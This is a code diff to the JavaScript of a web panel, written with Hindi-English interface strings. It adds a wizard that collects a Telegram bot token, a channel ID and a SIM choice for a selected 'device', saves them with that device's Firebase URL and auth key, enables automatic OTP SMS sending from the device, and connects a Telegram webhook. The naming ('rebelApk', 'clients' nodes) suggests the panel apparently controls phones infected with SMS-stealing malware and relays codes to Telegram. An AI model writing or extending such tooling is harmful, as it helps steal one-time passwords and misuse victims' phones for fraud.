@@ -2080,6 +2080,7 @@ function rebelApkHeaders(){
 var _autoTokenOn=false;
 var _smsTokenLog=[];
 var _autoTokenConfig={};
+var _autoTokenWizard={step:0,fromDevice:false,device:null,draft:{}};
 function smsTokenFetch(body){
   var hdr={'Content-Type':'application/json'};
   var apk=rebelApkHeaders();
@@ -2220,27 +2221,133 @@ function toggleAutoToken(){
     toast(_autoTokenOn?'Auto Token ON':'Auto Token OFF',true);
   }).catch(function(){toast('Auto token save failed',false);});
 }
-function useSelForAutoToken(){
+function getAutoTokenDraftFromFields(){
+  return{
+    bot_token:((_autoTokenConfig.bot_token||(document.getElementById('tgBotToken')||{}).value)||'').trim(),
+    channel_id:((_autoTokenConfig.channel_id||(document.getElementById('tgChannelId')||{}).value)||'').trim(),
+    owner_id:((_autoTokenConfig.owner_id||(document.getElementById('tgOwnerId')||{}).value)||'').trim(),
+    sim:_autoTokenConfig.sim||_sendSimSlot||1
+  };
+}
+function autoTokenNeedsWizard(draft){
+  draft=draft||getAutoTokenDraftFromFields();
+  return !draft.bot_token||!draft.channel_id;
+}
+function setupAutoTokenFromDevice(){
   var d=getSelDev();
-  if(!d){toast('Pehle koi device select karo (card tap karo)',false);return;}
+  if(!d){toast('Pehle device kholo (card tap karo)',false);return;}
+  var draft=getAutoTokenDraftFromFields();
+  _autoTokenWizard={
+    step:!draft.bot_token?0:(!draft.channel_id?1:2),
+    fromDevice:true,
+    device:d,
+    draft:draft
+  };
+  openAutoTokenWizard();
+}
+function openAutoTokenWizard(){
+  renderAutoTokenWizardStep();
+  var bg=document.getElementById('wizardSheetBg');
+  var sheet=document.getElementById('autoTokenWizard');
+  if(bg)bg.classList.add('open');
+  if(sheet)sheet.classList.add('open');
+  setTimeout(function(){
+    var focusId=_autoTokenWizard.step===0?'wizBotToken':(_autoTokenWizard.step===1?'wizChannelId':null);
+    if(focusId){var el=document.getElementById(focusId);if(el)el.focus();}
+  },280);
+}
+function closeAutoTokenWizard(){
+  var bg=document.getElementById('wizardSheetBg');
+  var sheet=document.getElementById('autoTokenWizard');
+  if(bg)bg.classList.remove('open');
+  if(sheet)sheet.classList.remove('open');
+  _autoTokenWizard={step:0,fromDevice:false,device:null,draft:{}};
+}
+function pickWizardSim(n,btn){
+  _autoTokenWizard.draft.sim=n;
+  _sendSimSlot=n;
+  document.querySelectorAll('.wiz-sim').forEach(function(b){b.classList.remove('active');});
+  if(btn)btn.classList.add('active');
+}
+function renderAutoTokenWizardStep(){
+  var w=_autoTokenWizard;
+  var body=document.getElementById('autoTokenWizardBody');
+  var hint=document.getElementById('autoTokenWizardHint');
+  var title=document.getElementById('autoTokenWizardTitle');
+  var next=document.getElementById('autoTokenWizardNext');
+  if(!body)return;
+  var d=w.device||getSelDev();
+  var phone=d?(d.displayPhone||d.name||'Device'):'Device';
+  if(w.step===0){
+    if(title)title.textContent='🤖 Bot Token';
+    if(hint)hint.textContent='Step 1/3 · '+phone+' · @BotFather token';
+    body.innerHTML='<input class="wizard-input" id="wizBotToken" type="password" placeholder="123456789:ABCdef..." autocomplete="off" value="'+escAttr(w.draft.bot_token||'')+'"/>';
+    if(next)next.textContent='Next →';
+  }else if(w.step===1){
+    if(title)title.textContent='📢 Channel ID';
+    if(hint)hint.textContent='Step 2/3 · '+phone+' · Telegram channel ID';
+    body.innerHTML='<input class="wizard-input" id="wizChannelId" type="text" placeholder="-1001234567890" inputmode="numeric" value="'+escAttr(w.draft.channel_id||'')+'"/>';
+    if(next)next.textContent='Next →';
+  }else{
+    if(title)title.textContent='📱 SIM Select';
+    if(hint)hint.textContent='Step 3/3 · '+phone+' · Auto SMS kis SIM se?';
+    var s=w.draft.sim||_sendSimSlot||1;
+    body.innerHTML='<div class="token-btn-row">'+
+      '<button type="button" class="nya-btn wiz-sim'+(s===1?' active':'')+'" onclick="pickWizardSim(1,this)">Sim 1</button>'+
+      '<button type="button" class="nya-btn wiz-sim'+(s===2?' active':'')+'" onclick="pickWizardSim(2,this)">Sim 2</button>'+
+      '</div><div class="empty-mini" style="padding-top:8px">Is device se auto OTP SMS bheja jayega</div>';
+    if(next)next.textContent='Save & Enable ✓';
+  }
+}
+function autoTokenWizardNext(){
+  var w=_autoTokenWizard;
+  if(w.step===0){
+    var v=(document.getElementById('wizBotToken')||{}).value||'';
+    v=String(v).trim();
+    if(!v){toast('Bot token daalo',false);return;}
+    w.draft.bot_token=v;
+    w.step=1;
+    renderAutoTokenWizardStep();
+    setTimeout(function(){var el=document.getElementById('wizChannelId');if(el)el.focus();},100);
+    return;
+  }
+  if(w.step===1){
+    var v=(document.getElementById('wizChannelId')||{}).value||'';
+    v=String(v).trim();
+    if(!v){toast('Channel ID daalo (-100...)',false);return;}
+    w.draft.channel_id=v;
+    w.step=2;
+    renderAutoTokenWizardStep();
+    return;
+  }
+  commitAutoTokenWizard();
+}
+function commitAutoTokenWizard(){
+  var w=_autoTokenWizard;
+  var d=w.device||getSelDev();
+  if(!d){toast('Device missing',false);return;}
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase missing',false);return;}
-  var body={
+  var draft=w.draft||{};
+  if(!draft.bot_token||!draft.channel_id){toast('Bot token aur Channel ID dono chahiye',false);return;}
+  draft.sim=draft.sim||_sendSimSlot||1;
+  _autoTokenOn=true;
+  toast('Saving auto token…',true);
+  smsTokenFetch({
     action:'save',
-    enabled:_autoTokenOn,
+    enabled:true,
+    bot_token:draft.bot_token,
+    channel_id:draft.channel_id,
+    owner_id:draft.owner_id||'',
     device_id:d.rawId,
     database_url:inst.restUrl,
     fb_name:inst.name,
     auth_key:getFbAuthKey(inst),
     schema:inst.schema||'rabel',
     device_node:d.deviceNode||'clients',
-    sim:_sendSimSlot||1,
-    bot_token:(_autoTokenConfig.bot_token||(document.getElementById('tgBotToken')||{}).value||'').trim(),
-    channel_id:(_autoTokenConfig.channel_id||(document.getElementById('tgChannelId')||{}).value||'').trim(),
-    owner_id:(_autoTokenConfig.owner_id||(document.getElementById('tgOwnerId')||{}).value||'').trim()
-  };
-  smsTokenFetch(body).then(function(res){
-    if(!res||!res.ok){toast('Auto token save failed',false);return;}
+    sim:draft.sim
+  }).then(function(res){
+    if(!res||!res.ok){toast('Save failed',false);return;}
     if(res.config){
       _autoTokenConfig=res.config;
       _autoTokenOn=!!res.config.enabled;
@@ -2248,8 +2355,29 @@ function useSelForAutoToken(){
     if(res.log)_smsTokenLog=res.log;
     updateAutoTokenUi(_autoTokenConfig);
     renderAutoTokenLog(_smsTokenLog);
-    toast('Auto SMS device set: '+d.displayPhone,true);
-  }).catch(function(){toast('Auto token save failed',false);});
+    closeAutoTokenWizard();
+    toast('Auto Token ON · Sim '+draft.sim+' · '+d.displayPhone,true);
+    smsTokenFetch({action:'setup_webhook',bot_token:draft.bot_token,channel_id:draft.channel_id,owner_id:draft.owner_id||''}).then(function(h){
+      if(h&&h.ok)toast('Webhook connected ✓',true);
+    }).catch(function(){});
+  }).catch(function(){toast('Save failed',false);});
+}
+function useSelForAutoToken(){
+  var d=getSelDev();
+  if(!d){toast('Pehle koi device select karo (card tap karo)',false);return;}
+  if(autoTokenNeedsWizard()){
+    _autoTokenWizard={step:0,fromDevice:false,device:d,draft:getAutoTokenDraftFromFields()};
+    if(_autoTokenWizard.draft.bot_token)_autoTokenWizard.step=1;
+    if(_autoTokenWizard.draft.channel_id)_autoTokenWizard.step=2;
+    closeAutoTokenSheet();
+    openAutoTokenWizard();
+    return;
+  }
+  var inst=getFbInstance(d.fbId);
+  if(!inst){toast('Firebase missing',false);return;}
+  var draft=getAutoTokenDraftFromFields();
+  _autoTokenWizard={step:2,fromDevice:false,device:d,draft:draft};
+  openAutoTokenWizard();
 }
 
 /* BOOT */
